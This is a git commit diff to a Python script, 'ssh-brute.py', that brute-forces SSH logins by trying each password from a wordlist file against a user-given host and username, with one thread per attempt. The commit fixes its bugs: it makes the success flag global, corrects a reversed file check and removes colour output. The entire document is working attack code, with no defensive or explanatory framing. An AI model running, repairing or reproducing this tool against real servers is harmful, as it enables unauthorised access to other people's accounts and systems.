7b9f0ad0830a03b79011591ff2a4715af9617177
Whiplash <devesh.shrestha21@gmail.com>
2025-12-07 12:09:07 +0545

    Update ssh-brute.py

--- ssh-brute.py
+++ ssh-brute.py
@@ -1,31 +1,31 @@
 import sys, os, socket
 import paramiko
 import threading, time
-from termcolor import colored
 
 flag = 0
 def sshConnect(brute):
+    global flag
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
     try:
         ssh.connect(host, port=22, username=user, password=brute)
         flag = 1
-        print(colored(f"[+] ssh: {brute}\n"),'green')
+        print(f"[+] ssh: {brute}\n")
     except socket.error:
-        print(colored(f"[-] ssh: [CF]\n"),'magenta')
+        print(f"[-] ssh: [CF]\n")
     except Exception as error:
-        print(colored(f"[-] ssh: [INC]\n"),'red')
+        print(f"[-] ssh: {brute} [INC]\n")
     ssh.close()
 
-try: 
+try:
     host = input("[?] host: ")
     user = input("[?] user: ")
     bruteFile = input("[?] file: ")
     if os.path.exists(bruteFile):
+        print(f"[~] scan: [ON]\n")
+    else:
         print(f"\n[!] path-error: [?F]\n")
         sys.exit()
-    else:
-        print(f"[~] scan: [ON]\n")
     with open(bruteFile, "r") as file:
         for line in file.readlines():
             attempt = line.strip()
@@ -34,6 +34,7 @@ try:
                 thread.join()
                 exit()
             thread.start()
-            time.sleep(0.5) 
+            time.sleep(0.5)
+
 except KeyboardInterrupt:
     print(f"\n[0]")
